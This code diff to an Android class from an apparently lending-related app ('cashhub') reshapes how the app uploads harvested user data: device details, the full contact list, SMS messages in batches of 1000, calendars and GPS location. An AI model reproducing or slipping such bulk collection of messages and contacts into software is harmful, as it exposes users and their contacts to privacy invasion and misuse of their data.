@@ -15,6 +15,7 @@ import android.util.Log;
 import androidx.annotation.RequiresApi;
 import com.alibaba.fastjson.JSONException;
 import com.alibaba.fastjson.JSONObject;
+import com.blankj.utilcode.util.CollectionUtils;
 import com.cashhub.cash.common.utils.CommonUtil;
 import com.cashhub.cash.common.utils.DeviceUtils;
 import com.cashhub.cash.common.utils.LocationUtils;
@@ -24,6 +25,7 @@ import java.io.IOException;
 import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
 import java.util.Map;
 import java.util.Random;
@@ -83,11 +85,8 @@ public class UploadData {
     Log.d(TAG, "getAndSendDevice Start!!!");
     JSONObject deviceInfo = DeviceUtils.getSystemInfoReport(mContext);
 
-    JSONObject dataJson = new JSONObject();
-    dataJson.put("device", deviceInfo);
-
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", dataJson);
+    jsonObject.put("data", deviceInfo);
     Log.d(TAG, "deviceInfo:" + deviceInfo);
     postOssSign(jsonObject, 1);
   }
@@ -99,13 +98,13 @@ public class UploadData {
   public void getAndSendContact() {
     Log.d(TAG, "getAndSendContact Start!!!");
     List<JSONObject> contact = mSystemInfo.getAllContacts();
-
-    JSONObject dataJson = new JSONObject();
-    dataJson.put("contact", contact);
+    Log.d(TAG, "contact:" + contact);
+    if(CollectionUtils.isEmpty(contact)) {
+      return;
+    }
 
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", dataJson);
-    Log.d(TAG, "contact:" + contact);
+    jsonObject.put("data", contact);
     postOssSign(jsonObject, 2);
   }
 
@@ -172,11 +171,8 @@ public class UploadData {
 
         //每1000条数据上传一次
         if(mInfoList != null && mInfoList.size() > 0 && mInfoList.size() >= mMaxCount) {
-          JSONObject dataJson = new JSONObject();
-          dataJson.put("sms", mInfoList);
-
           jsonObject.remove("data");
-          jsonObject.put("data", dataJson);
+          jsonObject.put("data", mInfoList);
           mInfoList = new ArrayList<>();
           postOssSign(jsonObject, 3);
         }
@@ -185,11 +181,8 @@ public class UploadData {
       cusor.close();
 
       if(mInfoList != null && mInfoList.size() > 0) {
-        JSONObject dataJson = new JSONObject();
-        dataJson.put("sms", mInfoList);
-
         jsonObject.remove("data");
-        jsonObject.put("data", dataJson);
+        jsonObject.put("data", mInfoList);
         mInfoList = new ArrayList<>();
         postOssSign(jsonObject, 3);
       }
@@ -204,12 +197,12 @@ public class UploadData {
     Log.d(TAG, "getAndSendCalendar Start!!!");
     List<JSONObject> calendars = mSystemInfo.getCalendars();
     Log.d(TAG, "calendars post data:" + calendars.toString());
-
-    JSONObject dataJson = new JSONObject();
-    dataJson.put("calendar", calendars);
+    if(CollectionUtils.isEmpty(calendars)) {
+      return;
+    }
 
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", dataJson);
+    jsonObject.put("data", calendars);
     Log.d(TAG, "calendars:" + calendars);
     postOssSign(jsonObject, 4);
   }
@@ -228,11 +221,8 @@ public class UploadData {
     locationJson.put("latitude", location[0]);
     locationJson.put("longitude", location[1]);
 
-    JSONObject dataJson = new JSONObject();
-    dataJson.put("location", locationJson);
-
     JSONObject jsonObject = new JSONObject();
-    jsonObject.put("data", dataJson);
+    jsonObject.put("data", locationJson);
     postOssSign(jsonObject, 5);
   }
 
